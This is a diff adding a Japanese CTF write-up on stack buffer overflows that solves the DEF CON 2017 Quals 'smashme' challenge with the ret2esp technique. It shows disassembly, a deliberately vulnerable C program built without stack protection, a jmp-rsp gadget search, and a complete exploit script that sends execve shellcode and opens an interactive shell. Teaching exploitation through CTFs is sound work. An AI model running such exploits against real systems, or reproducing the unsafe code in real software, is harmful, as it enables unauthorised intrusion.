@@ -466,8 +466,324 @@ Automatic Fortificationは脆弱性の原因となるような関数をコンパ
 
 ![AF.jpg](./AF.jpg)
 
-ret2esp
+# CTFで学ぶ脆弱性 (スタックバッファオーバーフロー編)
 
-アドレス空間のランダム化機能であるASLR（Address Space Layout Randomization）機構
+アドレス空間のランダム化機能であるASLR機構は、これらを回避する`Return Oriented Programming`などの攻撃手法も登場する。
 
-これらを回避するReturn Oriented Programmingなどの攻撃手法も登場
+## 攻撃手法 ret2esp
+
+ret2espは`Return to esp`の略称。
+espとはスタックポインタとも呼ばれ、常にスタックの先頭を指しているレジスタ。
+ret2espはリターンアドレスを書き換えてespが指す先にプログラムの処理を遷移させる攻撃手法。
+今回はespが指す先にシェルコードを配置することでシェルコードを動かす。
+
+それでは具体的にどこのアドレスを指すようにリターンアドレスを書き換えれば良いのか。
+ここで、`ASLR`が有効でも`.textセクション`は固定のアドレスに配置されるという性質を利用する。
+`.textセクション`内に`jmp esp`のような命令がある場合に、そこにリターンするように書き換えることでシェルコードが実行される。
+以下の図が遷移のイメージです。
+リターンするとスタックがpopされ、書き換えられたリターンアドレスに処理が遷移する。
+その後、espが指す先に遷移し、シェルコードが実行される。
+
+![ctf01_03.png](./ctf01_03.png)
+
+## CTF問題の練習
+
+問題文
+
+```
+Welcome to 2017 DEF CON Quals!
+smashme_omgbabysfirst.quals.shallweplayaga.me 57348
+[Files](https://2017.notmalware.ru/ac33905b2171d28ea2e15f8caa4a202bcdae18da/smashme)
+```
+
+- 脆弱性を含む実行ファイルとサーバーのFQDN、ポート番号が与えられます。
+- 実行ファイルを解析して、脆弱性を発見します。
+- サーバーに攻撃をして、サーバー内に保存されているフラグファイルを取得します。
+
+### 解析
+
+```Bash
+# intel構文で出力する
+$ objdump -d smashme -M intel > dump.txt
+
+$ cat dump.txt
+```
+
+`<main>`関数を抽出する。
+
+```
+00000000004009ae <main>:
+  4009ae:       55                      push   rbp
+  4009af:       48 89 e5                mov    rbp,rsp
+  4009b2:       48 83 ec 50             sub    rsp,0x50
+  4009b6:       89 7d bc                mov    DWORD PTR [rbp-0x44],edi
+  4009b9:       48 89 75 b0             mov    QWORD PTR [rbp-0x50],rsi
+  4009bd:       bf a8 06 4a 00          mov    edi,0x4a06a8
+  4009c2:       e8 d9 f2 00 00          call   40fca0 <_IO_puts>
+  4009c7:       48 8b 05 7a 8d 2c 00    mov    rax,QWORD PTR [rip+0x2c8d7a]        # 6c9748 <_IO_stdin>
+  4009ce:       48 89 c7                mov    rdi,rax
+  4009d1:       e8 aa ed 00 00          call   40f780 <_IO_fflush>
+  4009d6:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  4009da:       48 89 c7                mov    rdi,rax
+  4009dd:       b8 00 00 00 00          mov    eax,0x0
+  4009e2:       e8 e9 f0 00 00          call   40fad0 <_IO_gets>
+  4009e7:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  4009eb:       be d8 06 4a 00          mov    esi,0x4a06d8
+  4009f0:       48 89 c7                mov    rdi,rax
+  4009f3:       e8 28 f9 ff ff          call   400320 <.plt+0x30>
+  4009f8:       48 85 c0                test   rax,rax
+  4009fb:       74 07                   je     400a04 <main+0x56>
+  4009fd:       b8 00 00 00 00          mov    eax,0x0
+  400a02:       eb 0a                   jmp    400a0e <main+0x60>
+  400a04:       bf 00 00 00 00          mov    edi,0x0
+  400a09:       e8 22 e0 00 00          call   40ea30 <exit>
+  400a0e:       c9                      leave
+  400a0f:       c3                      ret
+```
+
+#### push rbp
+
+`rbp`はベースポインタと呼ばれるレジスタで、関数に割り当てられたスタック領域のベース(底)を示す。
+関数が呼ばれた時点では、`rbp`には呼び出し元の関数のベースポインタの値が格納されているので、それを最初にpushすることで保存している。
+
+```
+  4009ae:       55                      push   rbp
+```
+
+#### mov rbp,rsp
+
+続いて登場するrspはスタックポインタと呼ばれるレジスタで、スタックの最上段(最も最後に参照された位置)を示す。
+この値を`rbp`に代入することで、いまのスタックポインタをこの関数におけるベースポインタとする。
+
+```
+  4009af:       48 89 e5                mov    rbp,rsp
+```
+
+#### sub rsp,0x50
+
+rspから0x50(80)を引いて、rspレジスタに代入する。
+
+```
+  4009b2:       48 83 ec 50             sub    rsp,0x50
+```
+
+#### mov DWORD PTR [rbp-0x44],edi
+
+`[rbp - 0x44(68)]`のアドレスにediの値を代入する。
+
+```
+  4009b6:       89 7d bc                mov    DWORD PTR [rbp-0x44],edi
+```
+
+#### mov DWORD PTR [rbp-0x50],rsi
+
+`[rbp - 0x50(80)]`のアドレスにrsiの値を代入する。
+上記のアドレスから`12Bytes`離れた連続した位置にある。
+
+```
+  4009b9:       48 89 75 b0             mov    QWORD PTR [rbp-0x50],rsi
+```
+
+#### mov edi,0x4a06a8
+
+ediレジスタに`0x4a06a8`を代入する。
+
+```
+  4009bd:       bf a8 06 4a 00          mov    edi,0x4a06a8
+```
+
+#### leave
+
+`leave命令`は、以下の２つの命令を組み合わせたのと同等の処理をする。
+
+```
+mov rsp, rbp
+pop rbp
+```
+
+```
+  400a0e:       c9                      leave
+```
+
+#### ret
+
+ここまでで関数内の処理はすべて完了したので、あとは呼び出し元へと戻る。
+
+
+### 解析 (自前のコード)
+
+```c:smashme.o
+#include<stdio.h>
+#include<string.h>
+#include<stdlib.h>
+ 
+int main(int argc, char *argv[]){
+    char input[0x40];
+ 
+    puts("Welcome to the Dr. Phil Show. Wanna smash?");
+    fflush(stdin);
+
+    // 0x40(64バイト)以上でオーバーフロー
+    gets(input);
+  
+    // 特定の文字列を含んでいるかチェック
+    if(strstr(input, "Smash me outside, how bout dAAAAAAAAAAA")){
+        return 0;
+    }
+    exit(0);
+}
+```
+
+`smashme.o`というファイル名で保存するようにコンパイル。
+
+```
+$ gcc -fno-stack-protector -z execstack -static smashme.c -o smashme.o
+
+$ file smashme.o
+smashme.o: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=92bf79d3e9ffcae05d47c776b8a8864d68c151ca, for GNU/Linux 3.2.0, not stripped
+```
+
+プログラムの処理は主に以下の流れになっている。
+
+- 1 : 64バイトのバッファを用意
+- 2 : [Welcome to the Dr. Phil Show. Wanna smash ?] の出力処理
+- 3 : ユーザーからの入力処理
+- 4 : strstr()関数によって、ユーザーの入力の中に特定の文字列があるかチェック
+  - 特定の文字列「Smash me outside, how bout dAAAAAAAAAAA」
+  - 4.1 : 特定の文字列があればreturn 0;する
+  - 4.2 : 特定の文字列が無ければexit(0);で終了
+
+```Bash
+# 特定の文字列を含めて、Segmentation faultを発生させる
+$ python -c "print('Smash me outside, how bout dAAAAAAAAAAA' + 'A'*100)" | ./smashme.o
+Welcome to the Dr. Phil Show. Wanna smash?
+Segmentation fault
+```
+
+```Bash
+# 4.2. 特定の文字列が無いので、exit(0);で終了する
+$ python -c "print('A'*100)" | ./smashme.o
+Welcome to the Dr. Phil Show. Wanna smash?
+```
+
+dump2.txtで保存する。
+
+```
+$ objdump -d smashme -M intel > dump2.txt
+```
+
+アセンブリの中身を見てみる。
+
+```
+0000000000401d95 <main>:
+  401d95:       f3 0f 1e fa             endbr64
+  401d99:       55                      push   rbp
+  401d9a:       48 89 e5                mov    rbp,rsp
+  401d9d:       48 83 ec 50             sub    rsp,0x50
+  401da1:       89 7d bc                mov    DWORD PTR [rbp-0x44],edi
+  401da4:       48 89 75 b0             mov    QWORD PTR [rbp-0x50],rsi
+  401da8:       48 8d 3d 59 32 09 00    lea    rdi,[rip+0x93259]        # 495008 <_IO_stdin_used+0x8>
+  401daf:       e8 6c fd 00 00          call   411b20 <_IO_puts>
+  401db4:       48 8b 05 1d e9 0b 00    mov    rax,QWORD PTR [rip+0xbe91d]        # 4c06d8 <stdin>
+  401dbb:       48 89 c7                mov    rdi,rax
+  401dbe:       e8 1d f8 00 00          call   4115e0 <_IO_fflush>
+  401dc3:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  401dc7:       48 89 c7                mov    rdi,rax
+  401dca:       b8 00 00 00 00          mov    eax,0x0
+  401dcf:       e8 8c fb 00 00          call   411960 <_IO_gets>
+  401dd4:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  401dd8:       48 8d 35 59 32 09 00    lea    rsi,[rip+0x93259]        # 495038 <_IO_stdin_used+0x38>
+  401ddf:       48 89 c7                mov    rdi,rax
+  401de2:       e8 d9 f2 ff ff          call   4010c0 <.plt+0xa0>
+  401de7:       48 85 c0                test   rax,rax
+  401dea:       74 07                   je     401df3 <main+0x5e>
+  401dec:       b8 00 00 00 00          mov    eax,0x0
+  401df1:       eb 0a                   jmp    401dfd <main+0x68>
+  401df3:       bf 00 00 00 00          mov    edi,0x0
+  401df8:       e8 c3 e3 00 00          call   4101c0 <exit>
+  401dfd:       c9                      leave
+  401dfe:       c3                      ret
+  401dff:       90                      nop
+```
+
+### リターンアドレスの書き換え
+バッファの先頭からリターンアドレスまでの位置はバッファサイズ64バイトに加えて、rbpレジスタのバックアップがスタック領域に保存されている。
+ここではrbpレジスタの詳しい説明は割愛しますが、8バイトの領域が使われているので、64 + 8 = 72バイトがリターンアドレスまでのサイズです。
+
+### shellcodeの実行のさせ方
+
+リターンアドレスをどこ宛に書き換えればよいかを探す。
+ここではrp++というツールを用いて、`.textセクション内にrspレジスタが指すアドレス`に処理が遷移する命令を探す。
+
+```Bash
+$ rp -f ./smashme --rop=1 --unique | grep "jmp rsp"
+0x004c25aa: clc  ; jmp rsp ;  (1 found)
+0x004c54f2: cli  ; jmp rsp ;  (1 found)
+0x0045f782: jmp rsp ;  (5 found)
+0x004bd849: sar ebp, cl ; jmp rsp ;  (1 found)
+0x004bd84a: std  ; jmp rsp ;  (1 found)
+0x004c25a9: xor al, bh ; jmp rsp ;  (1 found)
+```
+
+真ん中の `jmp rsp` を使用する。
+
+### 計画
+
+解析した結果、どのような攻撃コードを作成すれば攻撃が成功するかを考える。
+
+脆弱性は入力時に64バイトより大きな入力を制限していない点にあり、64バイトより大きな入力を受け付けた場合にスタックバッファオーバーフローが発生する。
+その結果、リターンアドレスを書き換えることは可能ですが、入力した文字列に`「Smash me outside, how bout dAAAAAAAAAAA」`が含まれていなければ、書き換えたリターンアドレスに飛ぶことなくexit(0);で終了してしまう。
+そのため、攻撃を成功させるには、入力文字列に`「Smash me…（省略）」`という文字列を入れる必要がある。
+
+そして、.textセクション内にjmp rsp命令を探した結果、 `0x0045f782` にあることがわかる。
+そのため、リターンアドレスを `0x0045f782` に書き換える。
+最後に実行するためのシェルコードを入れることで攻撃コードができる。
+
+![ctf01_05.png](./ctf01_05.png)
+
+### 攻撃コード
+
+上で説明した流れを元に作成した攻撃コードは次のようになる。
+
+```python:exploit.py
+import socket
+import struct
+import telnetlib
+
+smash_me = 'Smash me outside, how bout dAAAAAAAAAAAA'
+buf_size = 64 + 8
+ret_addr = 0x0045f782 # jmp rsp
+
+# http://shell-storm.org/shellcode/files/shellcode-806.php
+shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+# \xd1\x9d\x96\x91\xd0\x8c\x97\xff = 0xFF978CD091969DD1
+
+
+buf = smash_me
+buf += 'A' * (buf_size - len(smash_me))
+buf += struct.pack('<Q', ret_addr)
+buf += shellcode
+
+print('len', len(smash_me))
+print('buf', buf)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('smashme_test.local', 57348))
+s.sendall(buf)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+実行する
+
+```
+$ python exploit.py
+
+ls
+```
+
+参考資料
+- https://www.intellilink.co.jp/article/column/ctf01.html
